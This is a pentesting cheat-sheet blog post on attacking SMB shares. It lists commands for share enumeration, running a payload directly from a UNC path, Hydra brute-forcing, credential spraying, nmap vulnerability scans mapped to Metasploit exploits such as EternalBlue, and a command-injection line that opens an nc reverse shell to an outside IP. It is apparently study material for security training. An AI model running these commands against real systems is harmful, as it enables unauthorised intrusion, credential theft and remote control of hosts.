---
layout: post
title: 'Working With SMB'
date: '2022-05-21'
description: 'A look at interacting with SMB Shares using the Windows Command line and using various tools available within Kali Linux.'
coverimage: Working_With_SMB.jpg
tags: hydra mount nmblookup
published: true
posttype: article
categories: article
---
## Working with SMB

### Windows

Windows commands for working with our share

```
net use \\10.1.1.99\IPC$ /user:evilsmb
net view 10.1.1.99
dir \\10.1.1.99\evilshare
copy \\10.1.1.99\evilshare\29.jpg mypic.jpg
```

Anonymous shares can be viewed without authenticating to the IPC$ share.

```
net view 10.1.1.99
```

Mount a share

```
net use Y \\10.1.1.99\myshare  /user:eviltest
cd /d Y:\
dir
```

Executing files from SMB. Because of the way Windows treats UNC paths, it’s possible to just execute our binary directly from the SMB share without even needing to copy it over first. Just run the executable as if it were already local and the payload will fire:

```
C:\Users\evilsaint\Desktop> \\10.1.1.254\sharefolder\payload.exe
```

### Linux

Listing SMB shares with username and password
```
smbclient -L 10.1.1.99 -U username%password
```

Listing SMB Shares with anonymous connection
```
smbclient -N -L 10.1.1.99
```

Connecting to SMB Share with username and password
```
smbclient //10.1.1.99/myshare -U eviltest%evilpass
```

Connecting to SMB Share without username and password
```
smbclient //10.1.1.99/myshare
```

# SMB

### SMB Shares

List Shares of computers in Domain
```
Get-NetComputer -DomainController 172.20.50.254 | Get-NetShare
```

# Bruteforcing SMB with Hydra

Comma seperated username and passwords
```
hydra -v -V -C user-pass.txt 10.1.18.2 smb
```

not using comma separated
```
hydra -L users.txt -e ns 172.24.2.97 smb
```

# SMB

## NetBIOS

Find all hosts responding to netbios, the `q` supresses the headers
```
nbtscan -q 10.11.1.0\24
```

Look at more detail for a single host either by IP or hostname
```
nmblookup -A 10.50.1.254
nmblookup -S DC01
```

## Crackmapexec

```
crackmapexec smb 10.50.1.0\24
```

## NMAP

Run all Nmap SMB Checks

```
nmap -sS -p 445 -n --open --script=smb-vuln* <ip>
```

Exploit vulnerabilities with metasploit

| Vulnerability | Metasploit Module |
| --- | --- |
| smb-vuln-ms06-025  | exploit06_025_rasmans_reg |
| smb-vuln-ms07-029  | exploit07_029_msdns_zonename |
| smb-vuln-ms08-067  | exploit08_067_netapi |
| smb-vuln-cve2009-3103  | exploit09_050_smb2_negotiate_func_index |
| smb-vuln-ms17-010 | exploit17_010_eternalblue |

## SMB login (spray credentials)

```
msf > use auxiliary/scanner/smb/smb_login
show options
verbose off
set password to the obtained local admin password
remove user as pass
```

## Enum4linux

Enumerate SMB

```
enum4linux -a -u Administrator -p Passw0rd! 10.50.1.15
```

## SMB Client

Listing SMB shares with username and password
```
smbclient -L 10.1.1.99 -U username%password
```

Listing SMB Shares with anonymous connection
```
smbclient -N -L 10.1.1.99
```

Connecting to SMB Share with username and password
```
smbclient //10.1.1.99/myshare -U eviltest%evilpass
```

Connecting to SMB Share without username and password
```
smbclient //10.1.1.99/myshare
```

We can use smbclient over proxychains
```
proxychains smbclient '//192.168.1.230/myshare' -U 'MARVEL.LAB\Administrator%password123!'
```

We can tar up files or folders with smbclient
```
smbclient //10.129.121.21/guest -Tc test.tar secret.txt
smbclient //10.129.121.21/guest -Tc test.tar /tmp
```

## Mount Share

Mount SMB Share
```
mount -t  \\X.X.X.X\c$ \mnt\remote\ -o username=user,password=pass,rw
```

To get a shell back from an SMB share.
```
logon "\=`nc 10.11.0.233 443 -e \bin\bash`"
```

## SMBMap

Not very stealthy but can execute a command
```
python /usr/share/smbmap/smbmap.py -H 127.0.0.1 -u user -p pass -x 'net group "domain admins" \domain'
```

## SMBTree

SMB Tree can map out all smb shares in the neighbourhood.
```
smbtree
```